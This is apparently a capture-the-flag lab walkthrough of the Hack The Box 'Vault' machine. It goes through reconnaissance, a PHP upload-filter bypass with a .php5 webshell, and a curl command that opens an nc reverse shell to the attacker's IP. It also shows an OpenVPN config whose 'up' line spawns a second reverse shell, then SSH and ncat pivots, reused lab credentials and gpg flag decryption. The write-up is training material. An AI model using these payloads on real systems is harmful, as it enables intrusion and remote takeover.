1,Recon
port scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Page check
![](images/Pasted%20image%2020250205161949.png)
Then I would check all the web-contents
Since I see the page loads as index.php, I’ll search for php files, but not find anything new:
```
root@kali# gobuster -u http://10.10.10.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -x php

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : txt,html,php
[+] Timeout      : 10s
=====================================================
2018/11/04 05:24:14 Starting gobuster
=====================================================
/index.php (Status: 200)

```

Because of the index page have something interesting 
`We are proud to announce our first client: Sparklays (Sparklays.com still under construction)`
So I guess there would be `/sparklays`, Then I get the code 403 forbidden.
I would continue to check the web-contents of `/sparklays`
```
root@kali# gobuster -u http://10.10.10.109/sparklays -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/sparklays/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/03/27 21:13:17 Starting gobuster
=====================================================
/login.php (Status: 200)
/admin.php (Status: 200)
/design (Status: 301)
=====================================================
2018/11/06 09:28:34 Finished
=====================================================
```
`http://10.10.10.109/sparklays/login.php`
![](images/Pasted%20image%2020250205163138.png)
There is nothing here, only the `access denied` here.

`http://10.10.10.109/sparklays/admin.php`
![](images/Pasted%20image%2020250205163224.png)
But there seems like no POST request here.So there would nothing get back here.

`http://10.10.10.109/sparklays/design/`
There still a 403 code Forbidden here
Continue to check the web-cotents
```
root@kali# gobuster -u http://10.10.10.109/sparklays/design -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html -t 20

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.109/sparklays/design/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,html
[+] Timeout      : 10s
=====================================================
2019/03/28 06:56:46 Starting gobuster
=====================================================
/uploads (Status: 301)
/design.html (Status: 200)
=====================================================
2018/11/06 09:31:34 Finished
=====================================================
```
Then we can get into `http://10.10.10.109/sparklays/design/changelogo.php` from  `design.html`
![](images/Pasted%20image%2020250205170633.png)
We can only upload the image file and we can check it from `http://10.10.10.109/sparklays/design/uploads/cat4.jpeg`

So this would be a upload and command injection.I found the filtering is on the file name, because I can't upload the php file or any other file name.
I would check the valid file name by using burpsuite.
![](images/Pasted%20image%2020250205171725.png)
All the length of 753 or 754 is the valid extension.
`php5, png, jpg, gif`
So php5 would be our target here.
![](images/Pasted%20image%2020250205171903.png)
Then we can upload a webshell here and handle a reverse shell here.
`curl -s 'http://10.10.10.109/sparklays/design/uploads/cmd.php5?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.16.5%20443%20%3E/tmp/f'`

Then we get the reverse shell as `www-data`
By enumerating the resources, i found we can check the directory of dave, we can get the ssh file from the Desktop of dave. 
`dave Dav3therav3123`
We can use ssh to login as dave.

By checking the ifconfig 
```
ens192    Link encap:Ethernet  HWaddr 00:50:56:b9:87:2f  
          inet addr:10.10.10.109  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:872f/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb9:872f/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:360406 errors:0 dropped:0 overruns:0 frame:0
          TX packets:356115 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:58641123 (58.6 MB)  TX bytes:171116484 (171.1 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:34632 errors:0 dropped:0 overruns:0 frame:0
          TX packets:34632 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:2587256 (2.5 MB)  TX bytes:2587256 (2.5 MB)

virbr0    Link encap:Ethernet  HWaddr fe:54:00:17:ab:49  
          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:34 errors:0 dropped:0 overruns:0 frame:0
          TX packets:10 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:2296 (2.2 KB)  TX bytes:870 (870.0 B)
```

I know there are hosts in the 192.168.122.0/24 range. I can see that my current host is the .1
I’ll kick off a ping sweep and instantly find two additional hosts:
```
time for i in $(seq 1 254); do (ping -c 1 192.168.122.${i} | grep "bytes from" &); done

64 bytes from 192.168.122.1: icmp_seq=1 ttl=64 time=0.036 ms
64 bytes from 192.168.122.4: icmp_seq=1 ttl=64 time=0.861 ms
64 bytes from 192.168.122.5: icmp_seq=1 ttl=64 time=1.05 ms
```

I’ll start a port scan on the .4. The two open ports return almost immediately:
```
time for i in $(seq 1 65535); do (nc -zvn 192.168.122.4 ${i} 2>&1 | grep -v "Connection refused" &); done                                                       
Connection to 192.168.122.4 22 port [tcp/*] succeeded!
Connection to 192.168.122.4 80 port [tcp/*] succeeded!

```
We can port forward the remote port and address to our local machine.
`ssh -L 8080:192.168.122.4:80 dave@10.10.10.109`
Then we can check the `localhost:8080`
![](images/Pasted%20image%2020250205175706.png)
The first think to dns-config.php is not found
The second link to vpnconfig.php displays a page:
![](images/Pasted%20image%2020250205175815.png)

If I click “Test VPN”, it directs to http://192.168.122.4/vpnconfig.php?function=testvpn and prints “executed succesfully!” (typo in successfully) at the top.
There is way to  get RCE through a OpenVPN config. The short description is that a config can contain an up entry which is the command to execute after the connection is made.
https://www.bleepingcomputer.com/news/security/downloading-3rd-party-openvpn-configs-may-be-dangerous-heres-why/
The payload would be 
```
remote 192.168.122.1
ifconfig 10.200.0.2 10.200.0.1
dev tun
script-security 2
up "/bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.122.1 8080 >/tmp/f'"
nobind
```
Then we can update file and test vpn, remember to open netcat from the ssh shell.
`nc -nvlp 8080`
Then we can get the shell of `root@192.168.122.4`
From `/home/dave`, the files are different here
`ssh user.txt`
We can get the new ssh file
`dave dav3gerous567`

From the `.bash_history` of alex, I found something interesting here
```
ping 192.168.1.11
cd /var/www
ls
wget http://192.168.1.11:8888/DNS.zip

ping 192.168.5.2
sudo apt-get nmap
apt-get install nmap
```
Let's use nmap to check what happen for `192.168.5.2`machine
```
nmap 192.168.5.2 -Pn -f

Starting Nmap 7.01 ( https://nmap.org ) at 2025-02-05 07:19 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0025s latency).
Not shown: 998 filtered ports
PORT     STATE  SERVICE
53/tcp   closed domain
4444/tcp closed krb524
```

I would continue to check the log files `/var/log`
```
grep -rHa "192.168.5.2" /var/log
/var/log/auth.log:Jul 24 15:07:21 DNS sshd[1536]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
/var/log/auth.log:Jul 24 15:07:21 DNS sshd[1566]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
/var/log/auth.log:Jul 24 15:07:21 DNS sshd[1566]: Disconnected from 192.168.5.2 port 4444
/var/log/auth.log:Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
/var/log/auth.log:Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
/var/log/auth.log:Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
```

So I will try these command, and I get something useful 
```
/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f

Starting Nmap 7.01 ( https://nmap.org ) at 2025-02-05 07:29 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0021s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
987/tcp open  unknown
```

I can see what’s listening on 987 with nc:
```
# nc 192.168.5.2 987 -p 53
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
```

ssh doesn’t come with an option to set a source port. However, that brings me to the next two interesting commands from auth.log:
```
/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
```
```
I’ll look at the first command. It is running ncat listening on port 1234. --sh-exec allows ncat to execute the next command with /bin/sh and connect its stdin to stdout from the original listener. So in this case, I end us with a listener on 1234, and input is passed to another ncat that is connected to 192.168.5.2:987 using source port 53. That means once I set this up, I can then ssh to localhost port 1234, and it will connect me through to vault.
我会看第一个命令。它正在端口1234上运行NCAT侦听。 --sh-exec允许ncat使用/bin/sh执行下一个命令，并将其stdin连接到原始侦听器的stdin。因此，在这种情况下，我在1234年以听众结束了我们，输入将传递给使用源端口53连接到192.168.5.2：987的另一个ncat 。这意味着一旦我进行了设置，我就可以SSH到Local -Host端口1234，它将我与金库联系起来。
```

Firstly make the ssh tunnel in the background
`/usr/bin/ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" &`
Then `ssh dave@localhost -p 1234 -t bash` get the ssh shell as dave.

There is a file called `root.txt.gpg` and we can not crack that from that machine
```
dave@vault:~$ gpg -d root.txt.gpg
gpg -d root.txt.gpg
gpg: directory `/home/dave/.gnupg' created
gpg: new configuration file `/home/dave/.gnupg/gpg.conf' created
gpg: WARNING: options in `/home/dave/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/home/dave/.gnupg/secring.gpg' created
gpg: keyring `/home/dave/.gnupg/pubring.gpg' created
gpg: encrypted with RSA key, ID D1EB1F03
gpg: decryption failed: secret key not available
```

I’ll try to move the file to other machines. base64 appears to not be on the vault, but base32 is:
```
base32 -w0 root.txt.gpg 
QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY=
```

I’ll drop back to dns and create the file:
```
root@DNS:/dev/shm# echo QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY= | base32 -d > a.gpg

root@DNS:/dev/shm# file a.gpg 
a.gpg: PGP RSA encrypted session key - keyid: 10C678C7 31FEBD1 RSA (Encrypt or Sign) 4096b .

# gpg -d a.gpg
gpg -d a.gpg
gpg: directory `/root/.gnupg' created
gpg: new configuration file `/root/.gnupg/gpg.conf' created
gpg: WARNING: options in `/root/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/root/.gnupg/secring.gpg' created
gpg: keyring `/root/.gnupg/pubring.gpg' created
gpg: encrypted with RSA key, ID D1EB1F03
gpg: decryption failed: secret key not available
```

So I would continue to drop to `dave@ubuntu` machine
There is a key file in the `/home/dave/Desktop/key`
```
dave@ubuntu:~/Desktop$ echo QUBAYA6HPDDBBUPLD4BQCEAAUCMOVUY2GZXH4SL5RXIOQQYVMY4TAUFOZE64YFASXVITKTD56JHDLIHBLW3OQMKSHQDUTH3R6QKT3MUYPL32DYMUVFHTWRVO5Q3YLSY2R4K3RUOYE5YKCP2PAX7S7OJBGMJKKZNW6AVN6WGQNV5FISANQDCYJI656WFAQCIIHXCQCTJXBEBHNHGQIMTF4UAQZXICNPCRCT55AUMRZJEQ2KSYK7C3MIIH7Z7MTYOXRBOHHG2XMUDFPUTD5UXFYGCWKJVOGGBJK56OPHE25OKUQCRGVEVINLLC3PZEIAF6KSLVSOLKZ5DWWU34FH36HGPRFSWRIJPRGS4TJOQC3ZSWTXYPORPUFWEHEDOEOPWHH42565HTDUZ6DPJUIX243DQ45HFPLMYTTUW4UVGBWZ4IVV33LYYIB32QO3ONOHPN5HRCYYFECKYNUVSGMHZINOAPEIDO7RXRVBKMHASOS6WH5KOP2XIV4EGBJGM4E6ZSHXIWSG6EM6ODQHRWOAB3AGSLQ5ZHJBPDQ6LQ2PVUMJPWD2N32FSVCEAXP737LZ56TTDJNZN6J6OWZRTP6PBOERHXMQ3ZMYJIUWQF5GXGYOYAZ3MCF75KFJTQAU7D6FFWDBVQQJYQR6FNCH3M3Z5B4MXV7B3ZW4NX5UHZJ5STMCTDZY6SPTKQT6G5VTCG6UWOMK3RYKMPA2YTPKVWVNMTC62Q4E6CZWQAPBFU7NM652O2DROUUPLSHYDZ6SZSO72GCDMASI2X3NGDCGRTHQSD5NVYENRSEJBBCWAZTVO33IIRZ5RLTBVR7R4LKKIBZOVUSW36G37M6PD5EZABOBCHNOQL2HV27MMSK3TSQJ4462INFAB6OS7XCSMBONZZ26EZJTC5P42BGMXHE27464GCANQCRUWO5MEZEFU2KVDHUZRMJ6ABNAEEVIH4SS65JXTGKYLE7ED4C3UV66ALCMC767DKJTBKTTAX3UIRVNBQMYRI7XY= | base32 -d > a.gpg
dave@ubuntu:~/Desktop$ 
dave@ubuntu:~/Desktop$ cat key 
itscominghome
dave@ubuntu:~/Desktop$ gpg -d a.gpg

You need a passphrase to unlock the secret key for
user: "david <dave@david.com>"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
      "david <dave@david.com>"
ca468370b91d1f5906e31093d9bfe819

```
